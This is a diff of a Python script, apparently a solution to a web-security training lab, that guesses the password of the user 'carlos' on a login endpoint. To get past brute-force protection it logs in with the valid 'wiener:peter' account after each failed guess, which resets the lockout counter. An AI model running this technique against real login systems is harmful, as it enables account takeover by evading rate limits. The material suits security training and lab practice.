@@ -21,33 +21,25 @@ def check_url_exists(url):
 def find_password_login(base_url, passwords_str):
 
     password_extracted = ""
-    attempt_counter = 0
+    attempt_counter = 2 # set to 2 so that "attempt_counter > 1" in the loop below evaluates to false on initial execution
 
     print("[+] Determining Carlos' password via enumeration... Please wait patiently as the script runs.")
-
-    # initial login to get the session cookie
-    s = requests.Session()
-    r = s.post(base_url + "/login", verify=False, proxies=proxies, data="username=%s&password=%s" %("wiener", "peter"))
-    cookies = r.cookies
-
-    sleep(1)
 
     # enumerate 2 times then login with valid credentials then logout. Rinse and repeat.
     for password in passwords_str:
 
-        # login with wiener:peter to reset the login attempt counter, if required, before proceeding
-        if attempt_counter > 2:
+        # if required, login with wiener:peter to reset the login attempt counter before proceeding
+        if attempt_counter > 1:
+            r = requests.post(base_url + "/login", verify=False, proxies=proxies, data="username=%s&password=%s" %("wiener", "peter"))
 
-            s = requests.Session()
-            r = s.post(base_url + "/login", verify=False, proxies=proxies, data="username=%s&password=%s" %("wiener", "peter"))
-            cookies = r.cookies
+            # if for some reason, wiener:peter failed, try logging in again...
+            while "Log out" not in r.text:
+                r = requests.post(base_url + "/login", verify=False, proxies=proxies, data="username=%s&password=%s" %("wiener", "peter"))
 
-            sleep(1)
-
-            attempt_counter = 0 # reset counter
+            attempt_counter = 0 # reset login counter
 
         # try a password from the passwords list on username "carlos"
-        r = s.post(base_url + "/login", verify=False, proxies=proxies, cookies=cookies,
+        r = requests.post(base_url + "/login", verify=False, proxies=proxies,
                           data="username=%s&password=%s" %("carlos", password)) # attempt next password from list
         attempt_counter += 1 # increment counter
 
